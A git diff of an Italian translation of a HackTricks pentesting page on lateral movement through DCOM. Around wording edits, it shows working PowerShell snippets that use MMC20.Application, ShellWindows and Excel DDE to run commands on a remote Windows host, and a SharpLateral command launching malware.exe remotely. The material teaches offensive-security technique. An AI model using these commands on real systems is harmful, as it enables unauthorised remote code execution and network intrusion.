@@ -14,7 +14,7 @@
 
 **Try Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -25,7 +25,7 @@
 **Per ulteriori informazioni su questa tecnica, controlla il post originale su [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)**
 
 
-Gli oggetti del Distributed Component Object Model (DCOM) presentano una capacità interessante per interazioni basate su reti con gli oggetti. Microsoft fornisce una documentazione completa sia per DCOM che per Component Object Model (COM), accessibile [qui per DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) e [qui per COM](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx). È possibile recuperare un elenco delle applicazioni DCOM utilizzando il comando PowerShell:
+Gli oggetti del Modello di Oggetti Componenti Distribuiti (DCOM) presentano una capacità interessante per interazioni basate su rete con gli oggetti. Microsoft fornisce una documentazione completa sia per DCOM che per il Modello di Oggetti Componenti (COM), accessibile [qui per DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) e [qui per COM](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx). È possibile recuperare un elenco delle applicazioni DCOM utilizzando il comando PowerShell:
 ```bash
 Get-CimInstance Win32_DCOMApplication
 ```
@@ -37,12 +37,12 @@ Questa funzionalità facilita l'esecuzione di comandi su una rete tramite un'app
 ```
 Questo comando si connette all'applicazione DCOM e restituisce un'istanza dell'oggetto COM. Il metodo ExecuteShellCommand può quindi essere invocato per eseguire un processo sull'host remoto. Il processo coinvolge i seguenti passaggi:
 
-Controllare i metodi:
+Controlla i metodi:
 ```powershell
 $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
 $com.Document.ActiveView | Get-Member
 ```
-Ottenere RCE:
+Ottenere l'esecuzione remota di codice (RCE):
 ```powershell
 $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
 $com | Get-Member
@@ -55,12 +55,12 @@ ls \\10.10.10.10\c$\Users
 
 **Per ulteriori informazioni su questa tecnica, controlla il post originale [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**
 
-L'oggetto **MMC20.Application** è stato identificato come privo di "LaunchPermissions" espliciti, con autorizzazioni predefinite che consentono l'accesso agli amministratori. Per ulteriori dettagli, è possibile esplorare un thread [qui](https://twitter.com/tiraniddo/status/817532039771525120), e si consiglia l'uso di [@tiraniddo](https://twitter.com/tiraniddo)’s OleView .NET per filtrare gli oggetti senza autorizzazioni di avvio esplicite.
+L'oggetto **MMC20.Application** è stato identificato come privo di "LaunchPermissions" esplicite, con autorizzazioni predefinite che consentono l'accesso agli amministratori. Per ulteriori dettagli, è possibile esplorare un thread [qui](https://twitter.com/tiraniddo/status/817532039771525120), e si consiglia l'uso di [@tiraniddo](https://twitter.com/tiraniddo)’s OleView .NET per filtrare gli oggetti senza autorizzazioni di avvio esplicite.
 
-Due specifici oggetti, `ShellBrowserWindow` e `ShellWindows`, sono stati evidenziati per la mancanza di autorizzazioni di avvio esplicite. L'assenza di una voce di registro `LaunchPermission` in `HKCR:\AppID\{guid}` indica l'assenza di autorizzazioni esplicite.
+Due specifici oggetti, `ShellBrowserWindow` e `ShellWindows`, sono stati evidenziati per la mancanza di autorizzazioni di avvio esplicite. L'assenza di una voce di registro `LaunchPermission` sotto `HKCR:\AppID\{guid}` indica l'assenza di autorizzazioni esplicite.
 
 ###  ShellWindows
-Per `ShellWindows`, che non ha un ProgID, i metodi .NET `Type.GetTypeFromCLSID` e `Activator.CreateInstance` facilitano l'istanziazione dell'oggetto utilizzando il suo AppID. Questo processo sfrutta OleView .NET per recuperare il CLSID per `ShellWindows`. Una volta istanziato, è possibile interagire tramite il metodo `WindowsShell.Item`, portando a invocazioni di metodi come `Document.Application.ShellExecute`.
+Per `ShellWindows`, che manca di un ProgID, i metodi .NET `Type.GetTypeFromCLSID` e `Activator.CreateInstance` facilitano l'istanziazione dell'oggetto utilizzando il suo AppID. Questo processo sfrutta OleView .NET per recuperare il CLSID per `ShellWindows`. Una volta istanziato, l'interazione è possibile attraverso il metodo `WindowsShell.Item`, portando all'invocazione del metodo come `Document.Application.ShellExecute`.
 
 Sono stati forniti esempi di comandi PowerShell per istanziare l'oggetto ed eseguire comandi in remoto:
 ```powershell
@@ -96,7 +96,7 @@ $Obj.DisplayAlerts = $false
 $Obj.DDEInitiate("cmd", "/c $Command")
 }
 ```
-### Strumenti di Automazione per il Movimento Laterale
+### Strumenti di Automazione per lo Spostamento Laterale
 
 Due strumenti sono evidenziati per automatizzare queste tecniche:
 
@@ -120,20 +120,20 @@ SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
 
 **Try Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
 <details>
 
-<summary><strong>Impara l'hacking AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Altri modi per supportare HackTricks:
 
 * Se desideri vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
 * Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
-* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
+* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT**](https://opensea.io/collection/the-peass-family) esclusivi
 * **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repository di Github.
+* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
